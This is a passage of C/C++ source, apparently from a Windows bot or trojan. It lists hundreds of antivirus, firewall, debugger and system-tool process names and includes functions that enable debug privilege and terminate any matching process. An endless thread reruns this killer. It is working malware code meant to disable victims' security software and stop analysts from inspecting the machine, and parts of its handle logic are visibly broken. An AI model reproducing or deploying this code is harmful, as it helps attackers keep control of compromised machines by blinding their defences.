		"NC2000.EXE", "NCINST4.EXE", "NDD32.EXE", "NEOMONITOR.EXE", "NEOWATCHLOG.EXE", "NETARMOR.EXE", "NETD32.EXE",
		"NETINFO.EXE", "NETMON.EXE", "NETSCANPRO.EXE", "NETSPYHUNTER-1.2.EXE", "NETSTAT.EXE", "NETUTILS.EXE",
		"NISSERV.EXE", "NISUM.EXE", "NMAIN.EXE", "NOD32.EXE", "NORMIST.EXE", "NORTON_INTERNET_SECU_3.0_407.EXE",
		"NOTSTART.EXE", "NPF40_TW_98_NT_ME_2K.EXE", "NPFMESSENGER.EXE", "NPROTECT.EXE", "NPSCHECK.EXE",
		"NPSSVC.EXE", "NSCHED32.EXE", "NSSYS32.EXE", "NSTASK32.EXE", "NSUPDATE.EXE", "NT.EXE", "NTRTSCAN.EXE", "NTVDM.EXE",
		"NTXconfig.EXE", "NUI.EXE", "NUPGRADE.EXE", "NUPGRADE.EXE", "NVARCH16.EXE", "NVC95.EXE", "NVSVC32.EXE",
		"NWINST4.EXE", "NWSERVICE.EXE", "NWTOOL16.EXE", "OLLYDBG.EXE", "ONSRVR.EXE", "OPTIMIZE.EXE", "OSTRONET.EXE",
		"OTFIX.EXE", "OUTPOST.EXE", "OUTPOST.EXE", "OUTPOSTINSTALL.EXE", "OUTPOSTPROINSTALL.EXE", "PADMIN.EXE",
		"PANIXK.EXE", "PATCH.EXE", "PAVCL.EXE", "PAVPROXY.EXE", "PAVSCHED.EXE", "PAVW.EXE",
		"PCFWALLICON.EXE", "PCIP10117_0.EXE", "PCSCAN.EXE", "PDSETUP.EXE", "PERISCOPE.EXE", "PERSFW.EXE",
		"PERSWF.EXE", "PF2.EXE", "PFWADMIN.EXE", "PGMONITR.EXE", "PINGSCAN.EXE", "PLATIN.EXE", "POP3TRAP.EXE", "POPROXY.EXE",
		"POPSCAN.EXE", "PORTDETECTIVE.EXE", "PORTMONITOR.EXE", "POWERSCAN.EXE", "PPINUPDT.EXE", "PPTBC.EXE",
		"PPVSTOP.EXE", "PRIZESURFER.EXE", "PRMT.EXE", "PRMVR.EXE", "PROCDUMP.EXE", "PROCESSMONITOR.EXE",
		"PROCEXPLORERV1.0.EXE", "PROGRAMAUDITOR.EXE", "PROPORT.EXE", "PROTECTX.EXE", "PSPF.EXE", "PURGE.EXE",
		"QCONSOLE.EXE", "QSERVER.EXE", "RAPAPP.EXE", "RAV7.EXE", "RAV7WIN.EXE",
		"RAV8WIN32ENG.EXE", "RAY.EXE", "RB32.EXE", "RCSYNC.EXE", "REALMON.EXE", "REGED.EXE", "REGEDIT.EXE", "REGEDT32.EXE",
		"RESCUE.EXE", "RESCUE32.EXE", "RRGUARD.EXE", "RSHELL.EXE", "RTVSCAN.EXE", "RTVSCN95.EXE", "RULAUNCH.EXE",
		"RUN32DLL.EXE", "RUNDLL.EXE", "RUNDLL16.EXE", "RUXDLL32.EXE", "SAFEWEB.EXE", "SAHAGENT.EXE", "SAVE.EXE",
		"SAVENOW.EXE", "SBSERV.EXE", "SC.EXE", "SCAM32.EXE", "SCAN32.EXE", "SCAN95.EXE", "SCANPM.EXE", "SCRSCAN.EXE",
		"SETUPVAMEEVAL.EXE", "SETUP_FLOWPROTECTOR_US.EXE", "SFC.EXE", "SGSSFW32.EXE", "SH.EXE",
		"SHELLSPYINSTALL.EXE", "SHN.EXE", "SHOWBEHIND.EXE", "SMC.EXE", "SMS.EXE", "SMSS32.EXE", "SOAP.EXE", "SOFI.EXE",
		"SPERM.EXE", "SPF.EXE", "SPHINX.EXE", "SPOLER.EXE", "SPOOLCV.EXE", "SPOOLSV32.EXE", "SPYXX.EXE", "SREXE.EXE",
		"SRNG.EXE", "SS3EDIT.EXE", "SSGRATE.EXE", "SSG_4104.EXE", "ST2.EXE", "START.EXE", "STCLOADER.EXE", "SUPFTRL.EXE",
		"SUPPORT.EXE", "SUPPORTER5.EXE", "SVC.EXE", "SVCHOSTC.EXE", "SVCHOSTS.EXE", "SVSHOST.EXE", "SWEEP95.EXE",
		"SWEEPNET.SWEEPSRV.SYS.SWNETSUP.EXE", "SYMPROXYSVC.EXE", "SYMTRAY.EXE", "SYSEDIT.EXE", "SYSTEM.EXE",
		"SYSTEM32.EXE", "SYSUPD.EXE", "TASKMG.EXE", "TASKMO.EXE", "TASKMON.EXE", "TAUMON.EXE", "TBSCAN.EXE", "TC.EXE",
		"TCA.EXE", "TCM.EXE", "TDS-3.EXE", "TDS2-NT.EXE", "TEEKIDS.EXE", "TFAK.EXE", "TFAK5.EXE", "TGBOB.EXE",
		"TITANIN.EXE", "TITANINXP.EXE", "TRACERT.EXE", "TRICKLER.EXE", "TRJSCAN.EXE", "TRJSETUP.EXE", "TROJANTRAP3.EXE",
		"TSADBOT.EXE", "TVMD.EXE", "TVTMD.EXE", "UNDOBOOT.EXE", "UPDAT.EXE", "UPDATE.EXE", "UPDATE.EXE", "UPGRAD.EXE",
		"UTPOST.EXE", "VBCMSERV.EXE", "VBCONS.EXE", "VBUST.EXE", "VBWIN9X.EXE", "VBWINNTW.EXE", "VCSETUP.EXE", "VET32.EXE",
		"VET95.EXE", "VETTRAY.EXE", "VFSETUP.EXE", "VIR-HELP.EXE", "VIRUSMDPERSONALFIREWALL.EXE", "VNLAN300.EXE",
		"VNPC3000.EXE", "VPC32.EXE", "VPC42.EXE", "VPFW30S.EXE", "VPTRAY.EXE", "VSCAN40.EXE", "VSCENU6.02D30.EXE",
		"VSCHED.EXE", "VSECOMR.EXE", "VSHWIN32.EXE", "VSISETUP.EXE", "VSMAIN.EXE", "VSMON.EXE", "VSSTAT.EXE",
		"VSWIN9XE.EXE", "VSWINNTSE.EXE", "VSWINPERSE.EXE", "W32DSM89.EXE", "W9X.EXE", "WATCHDOG.EXE", "WEBDAV.EXE",
		"WEBSCANX.EXE", "WEBTRAP.EXE", "WFINDV32.EXE", "WHOSWATCHINGME.EXE", "WIMMUN32.EXE",
		"WIN-BUGSFIX.EXE", "WIN32.EXE", "WIN32US.EXE", "WINACTIVE.EXE", "WINDOW.EXE", "WINDOWS.EXE", "WININETD.EXE",
		"WININIT.EXE", "WININITX.EXE", "WINLOGIN.EXE", "WINMAIN.EXE", "WINNET.EXE", "WINPPR32.EXE", "WINRECON.EXE",
		"WINSERVN.EXE", "WINSSK32.EXE", "WINSTART.EXE", "WINSTART001.EXE", "WINTSK32.EXE", "WINUPDATE.EXE",
		"WKUFIND.EXE", "WNAD.EXE", "WNT.EXE", "WRADMIN.EXE", "WRCTRL.EXE", "WSBGATE.EXE", "WUPDATER.EXE", "WUPDT.EXE",
		"WYVERNWORKSFIREWALL.EXE", "XPF202EN.EXE", "ZAPRO.EXE", "ZAPSETUP3001.EXE", "ZATUTOR.EXE", "ZONALM2601.EXE",
		"ZONEALARM.EXE", "_AVP32.EXE", "_AVPCC.EXE", "_AVPM.EXE", "CMD.EXE", "TASKMGR.EXE", "NEC.EXE", NULL };
#endif

int listProcesses(char *proccess, BOOL killthread, BOOL full)
{
	char sendbuf[512];

	HANDLE hProcess, hProcess2;
	PROCESSENTRY32 pe32 = {0};
	MODULEENTRY32 me32 = {0};
	
	if (CreateToolhelp32Snapshot && Process32First && Process32Next) {
		AdjustPrivileges(SE_DEBUG_NAME, TRUE);
		if ((hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0)) != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (Process32First(hProcess, &pe32)) {
				while (Process32Next(hProcess, &pe32)) {
					if (killthread) {
						#ifndef NO_AVFW_KILL
						for(int c = 0;c < (sizeof(kill_list) / sizeof(LPTSTR));c++) {
							if (lstrcmpi(pe32.szExeFile,kill_list[c]) == 0) {
 								if (hProcess2=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID))
									if (!TerminateProcess(hProcess2,0))
										CloseHandle(hProcess2);

								break;
							}
						}
						#endif
					}
					else if (!proccess) {
						if (full) {
								if (Module32First(hProcess2, &me32))
									sprintf(sendbuf," %s (%d)",me32.szExePath,pe32.th32ProcessID);
								else
									sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
						} else
								sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							CloseHandle(hProcess2);
							 
					}
					else {
						if (strcmp(pe32.szExeFile,proccess) == 0) {
 							hProcess2 = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
							CloseHandle(hProcess);

							if (!TerminateProcess(hProcess2,0)) {
								CloseHandle(hProcess2);

								return 0;
							}
							return 1;
						 }
					}
				} 
			}
			CloseHandle(hProcess);
		}
		AdjustPrivileges(SE_DEBUG_NAME, FALSE);
	}

 	return 0;
}

#ifndef NO_AVFW_KILL
void *KillAVThread::Run()
{

	while (1) {
		listProcesses(NULL,TRUE,TRUE);
		Sleep(killer_delay);
	}

	return NULL;
}
#endif

int killProcess(int pid)
{
	int ret=1;

 	HANDLE pHandle;
	
	if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid)) != NULL)
		if(!TerminateProcess(pHandle,0)) {
			ret=0;
			CloseHandle(pHandle);
		}

	return ret;
}

BOOL AdjustPrivileges(char *pPriv, BOOL add)
{
	BOOL bRet = FALSE;
	TOKEN_PRIVILEGES tkp;
 	HANDLE hToken;

	if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken))
		return bRet;

	if (!LookupPrivilegeValue(NULL, pPriv, &tkp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return bRet;
	}

	tkp.PrivilegeCount = 1; 
	if (add)
		tkp.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;
	else 
		tkp.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tkp.Privileges[0].Attributes);

	bRet=AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES) NULL, 0);
	
	CloseHandle(hToken);

	return bRet;
}
